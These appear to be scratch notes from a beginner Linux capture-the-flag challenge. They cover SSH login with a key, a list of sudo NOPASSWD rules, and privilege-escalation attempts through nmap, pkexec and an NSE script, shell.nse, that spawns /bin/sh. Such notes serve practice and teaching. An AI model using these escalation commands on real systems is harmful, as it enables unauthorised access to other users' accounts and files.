
chmod 400 id_ed25519
ssh -i id_ed25519 cerealkiller@beginner-linux.hfctf.ca


runuser nmapuser -s /bin/bash -c "nmap --script=/home/cerealkiller/ 127.0.0.1"

    (phantom) NOPASSWD: ALL
    (vimuser) NOPASSWD: /usr/bin/vim
    (nmapuser) NOPASSWD: /usr/bin/nmap
    (pathuser) NOPASSWD: /home/pathuser/pathuser.sh

    pkexec --user phantom cat /home/nmapuser/flag.txt

sudo -u nmapuser /usr/bin/nmap --script=/tmp/ 127.0.0.1

shell.nse
os.execute('/bin/sh')
